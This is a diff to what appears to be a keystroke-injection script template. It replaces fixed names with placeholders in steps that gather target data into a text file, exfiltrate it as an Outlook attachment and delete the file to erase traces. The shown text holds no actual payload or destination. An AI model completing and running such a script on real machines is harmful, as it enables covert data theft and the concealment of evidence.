@@ -70,17 +70,17 @@ REM - Step 3: Enumerate the target data and redirect it to a text file
 REM -------------------------- 
 
 DELAY 2000
-STRING echo '<POWERSHELL COMMAND>' > FILENAME.txt
+STRING echo '<POWERSHELL COMMAND>' > <FILENAME>.txt
 DELAY 500
 ENTER
 
 DELAY 500
-STRING echo '<POWERSHELL COMMAND>' > FILENAME.txt
+STRING echo '<POWERSHELL COMMAND>' > <FILENAME>.txt
 DELAY 500
 ENTER
 
 DELAY 500
-STRING echo '<POWERSHELL COMMAND>' > FILENAME.txt
+STRING echo '<POWERSHELL COMMAND>' > <FILENAME>.txt
 DELAY 500
 ENTER
 
@@ -91,11 +91,11 @@ REM - Step 4: Exfiltrate the text file containing the loot using Outlook
 REM -------------------------- 
 
 DELAY 500
-STRING $PWD = pwd
+STRING $<VARIABLE NAME> = pwd
 DELAY 500
 ENTER
 DELAY 500
-STRING $ATTACHMENT = "$PWD\FILENAME.txt"
+STRING $ATTACHMENT = "$<VARIABLE NAME>\<FILENAME>.txt"
 DELAY 500
 ENTER
 DELAY 500
@@ -135,7 +135,7 @@ REM - Step 5: Erase our tracks from the target machine
 REM -------------------------- 
 
 DELAY 500
-STRING del FILENAME.txt
+STRING del <FILENAME>.txt
 DELAY 500
 ENTER
 
